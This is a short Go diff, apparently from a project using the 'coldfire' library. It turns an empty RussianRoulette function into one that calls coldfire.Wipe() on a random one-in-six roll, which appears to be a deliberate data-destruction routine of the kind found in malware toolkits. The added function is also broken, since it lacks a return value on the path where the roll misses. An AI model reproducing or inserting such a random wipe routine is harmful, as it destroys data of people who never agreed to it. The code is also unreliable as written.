@@ -526,8 +526,10 @@ func WordCyryllicReplace(word string) []string {
 	return wordlist
 }
 
-func RussianRoulette() {
-
+func RussianRoulette() error {
+	if coldfire.RandomInt(1, 6) == 6 {
+		return coldfire.Wipe()
+	}
 }
 
 //Returns transformed words from input slice
